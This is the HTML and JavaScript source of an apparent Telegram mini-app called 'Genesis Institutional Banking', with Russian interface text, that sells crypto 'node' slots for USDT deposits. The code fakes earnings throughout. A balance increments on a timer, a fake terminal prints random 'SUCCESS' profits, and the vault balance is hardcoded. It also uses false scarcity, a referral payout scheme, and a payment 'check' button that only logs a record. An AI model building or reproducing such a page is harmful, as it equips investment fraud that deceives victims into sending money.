<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Genesis Institutional Banking</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        body { background: #0b0f1a; color: #f8fafc; font-family: 'Inter', sans-serif; overflow-x: hidden; -webkit-user-select: none; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.08); }
        .tab-content { display: none; min-height: 80vh; }
        .active { display: block; animation: slideUp 0.3s ease-out; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        
        .node-container { position: relative; width: 150px; height: 150px; margin: 0 auto; }
        .node-core { position: absolute; inset: 25%; background: radial-gradient(circle, #3b82f6, #1d4ed8); border-radius: 50%; box-shadow: 0 0 30px #3b82f6; animation: pulse 2s infinite; }
        .node-ring { position: absolute; inset: 0; border: 2px solid rgba(59, 130, 246, 0.2); border-radius: 50%; border-top-color: #3b82f6; animation: spin 3s linear infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }
        @keyframes spin { to { transform: rotate(360deg); } }

        .nav-btn { color: #64748b; transition: 0.3s; display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .nav-btn.active-nav { color: #3b82f6; }
        
        #terminal-lines { font-family: 'Courier New', monospace; font-size: 10px; color: #10b981; }

        #payment-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100; align-items: center; justify-content: center; padding: 20px; }
        .modal-content { background: #161e2e; border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; width: 100%; max-width: 400px; padding: 24px; }
    </style>
</head>
<body class="pb-24">

    <div id="payment-modal">
        <div class="modal-content text-center shadow-2xl">
            <h3 class="text-xl font-bold mb-2">–ê–∫—Ç–∏–≤–∞—Ü–∏—è —É–∑–ª–∞</h3>
            <p id="modal-node-name" class="text-xs text-blue-400 mb-6 uppercase tracking-widest font-bold">Mainnet Node</p>
            
            <div class="bg-black/40 p-4 rounded-xl border border-white/5 mb-6 text-left">
                <p class="text-[10px] text-slate-500 uppercase mb-2">–ê–¥—Ä–µ—Å –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è (USDT TRC-20)</p>
                <div class="flex items-center justify-between bg-black/20 p-2 rounded border border-white/5">
                    <code id="wallet-address" class="text-[10px] text-slate-300 break-all">T9zB1287asdqwe55621XczXcv99YtRwQ</code>
                </div>
                <p class="text-[9px] text-orange-400 mt-2">–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞: <span id="min-amount">$1000</span></p>
            </div>

            <button onclick="simulatePayment()" id="pay-btn" class="w-full py-4 rounded-xl bg-blue-600 font-bold text-sm transition-all active:scale-95">
                –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
            </button>
            <button onclick="closeModal()" class="mt-4 text-xs text-slate-500 uppercase font-bold tracking-widest">–û—Ç–º–µ–Ω–∞</button>
        </div>
    </div>

    <header class="p-6 flex justify-between items-center border-b border-white/5 bg-slate-900/20">
        <div>
            <h1 class="text-xs font-black tracking-[0.3em] text-blue-500 uppercase">Genesis</h1>
            <p id="user-name" class="text-[10px] text-slate-500 font-medium italic">–ó–∞–≥—Ä—É–∑–∫–∞ –ø—Ä–æ—Ñ–∏–ª—è...</p>
        </div>
        <div class="text-right">
            <p class="text-[9px] text-slate-500 uppercase">–ó–∞–≥—Ä—É–∑–∫–∞ —Å–µ—Ç–∏</p>
            <p class="text-xs font-bold text-orange-400">82.4%</p>
        </div>
    </header>

    <section id="dashboard" class="tab-content active p-6">
        <div class="node-container mb-8">
            <div class="node-ring"></div>
            <div class="node-ring" style="animation-duration: 5s; direction: reverse; opacity: 0.3;"></div>
            <div class="node-core"></div>
        </div>
        
        <div class="text-center mb-8">
            <p class="text-[10px] text-slate-400 uppercase tracking-[0.2em] mb-1">–ü–æ—Ä—Ç—Ñ–µ–ª—å –∞–∫—Ç–∏–≤–æ–≤</p>
            <h2 id="main-balance" class="text-5xl font-bold tracking-tighter">$0.00</h2>
        </div>

        <div class="grid grid-cols-2 gap-4">
            <div class="glass rounded-3xl p-4 text-center">
                <p class="text-[10px] text-slate-500 uppercase mb-1 font-bold">–•—ç—à—Ä–µ–π—Ç</p>
                <p id="hashrate-val" class="text-lg font-bold">0.0 TH/s</p>
            </div>
            <div class="glass rounded-3xl p-4 text-center">
                <p class="text-[10px] text-slate-500 uppercase mb-1 font-bold">–î–æ—Ö–æ–¥–Ω–æ—Å—Ç—å</p>
                <p class="text-lg font-bold text-emerald-400">~1.14%</p>
            </div>
        </div>
    </section>

    <section id="infrastructure" class="tab-content p-6">
        <h3 class="text-xl font-bold mb-6">–î–æ—Å—Ç—É–ø–Ω—ã–µ —É–∑–ª—ã</h3>
        <div class="space-y-4">
            <div class="glass rounded-[32px] p-6 border-l-4 border-blue-500">
                <div class="flex justify-between items-start mb-4">
                    <h4 class="font-bold">Mainnet Node</h4>
                    <span class="bg-blue-500/10 text-blue-400 text-[10px] px-2 py-1 rounded">Lvl 1</span>
                </div>
                <p class="text-3xl font-bold mb-4">$1,000</p>
                <button onclick="openModal('Mainnet Node', '$1,000')" class="w-full py-4 rounded-2xl bg-blue-600 font-bold text-sm">–ê—Ä–µ–Ω–¥–æ–≤–∞—Ç—å —Å–ª–æ—Ç</button>
            </div>
            
            <div class="glass rounded-[32px] p-6 border-l-4 border-amber-500 bg-amber-500/5 shadow-lg shadow-amber-500/5">
                <div class="flex justify-between items-start mb-4">
                    <h4 class="font-bold text-amber-500">Quantum Engine</h4>
                    <span class="bg-amber-500/20 text-amber-500 text-[10px] px-2 py-1 rounded">Lvl 3</span>
                </div>
                <p class="text-3xl font-bold mb-1">$50,000</p>
                <p class="text-[10px] text-amber-500/60 mb-6 italic">–û—Å—Ç–∞–ª–æ—Å—å —Å–ª–æ—Ç–æ–≤: 2/10</p>
                <button onclick="openModal('Quantum Engine', '$50,000')" class="w-full py-4 rounded-2xl bg-amber-600 text-black font-black text-sm">–ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å –¥–æ—Å—Ç—É–ø</button>
            </div>
        </div>
    </section>

    <section id="network" class="tab-content p-6 text-center pt-10">
        <div class="glass rounded-[32px] p-8">
            <div class="w-16 h-16 bg-blue-500/10 rounded-full mx-auto mb-4 border border-blue-500/20 flex items-center justify-center">ü§ù</div>
            <h2 class="text-xl font-bold mb-2 uppercase tracking-tight">–°–µ—Ç—å –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–æ–≤</h2>
            <p class="text-xs text-slate-500 mb-8">–í—ã –ø–æ–ª—É—á–∞–µ—Ç–µ 10% –æ—Ç –µ–∂–µ–¥–Ω–µ–≤–Ω–æ–≥–æ –¥–æ—Ö–æ–¥–∞ –∫–∞–∂–¥–æ–≥–æ –ø—Ä–∏–≥–ª–∞—à–µ–Ω–Ω–æ–≥–æ —É—á–∞—Å—Ç–Ω–∏–∫–∞.</p>
            <button class="w-full py-4 rounded-xl border border-dashed border-blue-500 text-blue-400 font-bold text-sm">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Ä–µ—Ñ-—Å—Å—ã–ª–∫—É</button>
        </div>
    </section>

    <section id="vault" class="tab-content p-6">
        <div class="glass rounded-[32px] p-8 text-center border-t border-emerald-500/20">
            <p class="text-[10px] text-slate-500 uppercase mb-2 font-black tracking-widest">–ë–∞–ª–∞–Ω—Å —Å–µ–π—Ñ–∞</p>
            <h2 class="text-4xl font-bold mb-8">$3,120.45</h2>
            <div class="grid grid-cols-2 gap-4">
                <button class="py-4 bg-white text-black font-bold rounded-2xl text-[10px] uppercase">–í—ã–≤–æ–¥</button>
                <button class="py-4 bg-emerald-600 text-white font-bold rounded-2xl text-[10px] uppercase">–†–µ–∏–Ω–≤–µ—Å—Ç</button>
            </div>
        </div>
    </section>

    <section id="terminal" class="tab-content p-6">
        <div class="bg-black border border-white/5 rounded-2xl p-4 h-[400px] overflow-hidden flex flex-col-reverse">
            <div id="terminal-lines" class="space-y-1"></div>
        </div>
    </section>

    <nav class="fixed bottom-0 left-0 right-0 h-20 glass border-t border-white/10 flex justify-around items-center z-50 px-2">
        <button onclick="nav('dashboard')" class="nav-btn active-nav">
            <span class="text-[9px] font-bold uppercase tracking-tighter">–ì–ª–∞–≤–Ω–∞—è</span>
        </button>
        <button onclick="nav('infrastructure')" class="nav-btn">
            <span class="text-[9px] font-bold uppercase tracking-tighter">–£–∑–ª—ã</span>
        </button>
        <button onclick="nav('terminal')" class="nav-btn">
            <div class="w-10 h-10 rounded-full bg-blue-600 flex items-center justify-center -mt-10 shadow-xl shadow-blue-600/40">
                <span class="text-white text-[8px] font-black italic">EXE</span>
            </div>
            <span class="text-[9px] font-bold uppercase tracking-tighter mt-1">–¢–µ—Ä–º–∏–Ω–∞–ª</span>
        </button>
        <button onclick="nav('network')" class="nav-btn">
            <span class="text-[9px] font-bold uppercase tracking-tighter">–°–µ—Ç—å</span>
        </button>
        <button onclick="nav('vault')" class="nav-btn">
            <span class="text-[9px] font-bold uppercase tracking-tighter">–°–µ–π—Ñ</span>
        </button>
    </nav>

    <script>
        // --- –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø SUPABASE ---
        const SUPABASE_URL = 'https://buvkhgfgrzmimsmyznpm.supabase.co';
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJ1dmtoZ2ZncnptaW1zbXl6bnBtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzAyNDU3NjEsImV4cCI6MjA4NTgyMTc2MX0.g_ZvbjVu0wlUwDnE3KyRNb2cO69Oq6QHZnUD4hK4yHQ';
        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        const tg = window.Telegram.WebApp;
        tg.expand();
        
        let currentBalance = 0;
        let currentUser = null;

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        async function initUser() {
            const user = tg.initDataUnsafe?.user || { id: 12345, username: 'local_test' }; // –î–ª—è —Ç–µ—Å—Ç–æ–≤ –≤–Ω–µ –¢–ì
            document.getElementById('user-name').innerText = 'ID: @' + user.username;

            // –ü—Ä–æ–±—É–µ–º –Ω–∞–π—Ç–∏ —é–∑–µ—Ä–∞ –≤ –±–∞–∑–µ
            let { data: profile, error } = await supabaseClient
                .from('profiles')
                .select('*')
                .eq('id', user.id)
                .single();

            if (!profile) {
                // –ï—Å–ª–∏ —é–∑–µ—Ä–∞ –Ω–µ—Ç, —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –µ–≥–æ
                const { data, error: regError } = await supabaseClient
                    .from('profiles')
                    .insert([{ id: user.id, username: user.username }])
                    .select()
                    .single();
                profile = data;
            }

            if (profile) {
                currentUser = profile;
                currentBalance = parseFloat(profile.balance);
                document.getElementById('hashrate-val').innerText = profile.hashrate + ' TH/s';
                updateBalanceDisplay();
            }
        }

        function updateBalanceDisplay() {
            document.getElementById('main-balance').innerText = '$' + currentBalance.toLocaleString('ru-RU', {minimumFractionDigits: 2});
        }

        // –ù–∞–≤–∏–≥–∞—Ü–∏—è
        function nav(id) {
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active-nav'));
            document.getElementById(id).classList.add('active');
            if(event) event.currentTarget.classList.add('active-nav');
            tg.HapticFeedback.impactOccurred('light');
        }

        function openModal(name, price) {
            document.getElementById('modal-node-name').innerText = name;
            document.getElementById('min-amount').innerText = price;
            document.getElementById('payment-modal').style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('payment-modal').style.display = 'none';
        }

        // –†–µ–∞–ª—å–Ω–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞—è–≤–∫–∏ –≤ –±–∞–∑—É
        async function simulatePayment() {
            const btn = document.getElementById('pay-btn');
            const tier = document.getElementById('modal-node-name').innerText;
            const amount = document.getElementById('min-amount').innerText;
            
            btn.innerHTML = '–°–≤—è–∑—å —Å –±–ª–æ–∫—á–µ–π–Ω–æ–º...';
            btn.disabled = true;

            const { error } = await supabaseClient
                .from('deposits')
                .insert([{ user_id: tg.initDataUnsafe?.user?.id || 12345, amount: amount, tier_name: tier }]);

            setTimeout(() => {
                tg.showAlert('–ó–∞—è–≤–∫–∞ –ø—Ä–∏–Ω—è—Ç–∞! –ü–æ—Å–ª–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –≤ —Å–µ—Ç–∏ TRC-20 (–æ–±—ã—á–Ω–æ 5-15 –º–∏–Ω), –≤–∞—à —Ö—ç—à—Ä–µ–π—Ç –∏ –±–∞–ª–∞–Ω—Å –±—É–¥—É—Ç –æ–±–Ω–æ–≤–ª–µ–Ω—ã.');
                btn.innerHTML = '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é';
                btn.disabled = false;
                closeModal();
            }, 2000);
        }

        // –ñ–∏–≤–æ–π –∏–Ω–∫—Ä–µ–º–µ–Ω—Ç –±–∞–ª–∞–Ω—Å–∞ (–∫–∞–∂–¥—ã–µ 3 —Å–µ–∫)
        setInterval(() => {
            if (currentBalance > 0) {
                currentBalance += 0.01;
                updateBalanceDisplay();
            }
        }, 3000);

        // –¢–µ—Ä–º–∏–Ω–∞–ª
        const termLines = document.getElementById('terminal-lines');
        function addTermLine() {
            const div = document.createElement('div');
            div.innerHTML = `<span class="text-slate-700">[${new Date().toLocaleTimeString()}]</span> ANALYZE... <span class="text-blue-500 font-bold">SUCCESS +$${(Math.random()*2).toFixed(2)}</span>`;
            termLines.prepend(div);
            if (termLines.children.length > 15) termLines.removeChild(termLines.lastChild);
        }
        setInterval(addTermLine, 4000);

        // –°—Ç–∞—Ä—Ç
        initUser();
    </script>
</body>
</html>
